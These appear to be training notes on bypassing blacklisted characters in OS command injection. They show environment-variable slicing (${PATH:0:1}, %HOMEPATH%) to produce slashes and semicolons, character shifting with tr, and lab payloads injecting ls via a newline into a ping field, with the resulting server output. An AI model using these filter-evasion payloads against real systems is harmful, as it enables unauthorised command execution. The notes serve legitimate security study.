# Bypassing Other Blacklisted Characters

## Linux

While ${IFS} is directly replaced with a space, there's no such environment variable for slashes or semi-colons

We can specify start and length of specific environment variables :

echo ${PATH}
/usr/local/bin:/usr/bin:/bin:/usr/games

echo ${PATH:0:1}
/

${PATH:0:1} is enough in our payload

echo ${LS_COLORS:10:1}
;

## Windows

echo %HOMEPATH:~6,-11%
\

Windows PowerShell :

$env:HOMEPATH[0]
\

$env:PROGRAMFILES[10]

We can also use the Get-ChildItem Env

## Character Shifting

man ascii     # \ is on 92, before it is [ on 91
echo $(tr '!-}' '"-~'<<<[)
\

--> Powershell can do the same

## LAB

127.0.0.1%0a{ls,-la}

PING 127.0.0.1 (127.0.0.1) 56(84) bytes of data.
64 bytes from 127.0.0.1: icmp_seq=1 ttl=64 time=0.015 ms

--- 127.0.0.1 ping statistics ---
1 packets transmitted, 1 received, 0% packet loss, time 0ms
rtt min/avg/max/mdev = 0.015/0.015/0.015/0.000 ms
total 16
drwxr-xr-x 1 www-data www-data 4096 Jul 16  2021 .
drwxr-xr-x 1 www-data www-data 4096 Aug 19  2020 ..
-rw-r--r-- 1 www-data www-data 1613 Jul 16  2021 index.php
-rw-r--r-- 1 www-data www-data 1256 Jul 12  2021 style.css

127.0.0.1%0a{ls,-la}${PATH:0:1}home

PING 127.0.0.1 (127.0.0.1) 56(84) bytes of data.
64 bytes from 127.0.0.1: icmp_seq=1 ttl=64 time=0.015 ms

--- 127.0.0.1 ping statistics ---
1 packets transmitted, 1 received, 0% packet loss, time 0ms
rtt min/avg/max/mdev = 0.015/0.015/0.015/0.000 ms

127.0.0.1%0a{ls,-la}${IFS}${PATH:0:1}home

PING 127.0.0.1 (127.0.0.1) 56(84) bytes of data.
64 bytes from 127.0.0.1: icmp_seq=1 ttl=64 time=0.017 ms

--- 127.0.0.1 ping statistics ---
1 packets transmitted, 1 received, 0% packet loss, time 0ms
rtt min/avg/max/mdev = 0.017/0.017/0.017/0.000 ms
/home:
total 12
drwxr-xr-x 1 root     root     4096 Jul 16  2021 .
drwxr-xr-x 1 root     root     4096 Jan  4 17:41 ..
drwxr-xr-x 1 1nj3c70r 1nj3c70r 4096 Jul 16  2021 1nj3c70r

/home:
total 12
drwxr-xr-x 1 root     root     4096 Jul 16  2021 .
drwxr-xr-x 1 root     root     4096 Jan  4 17:41 ..
drwxr-xr-x 1 1nj3c70r 1nj3c70r 4096 Jul 16  2021 1nj3c70r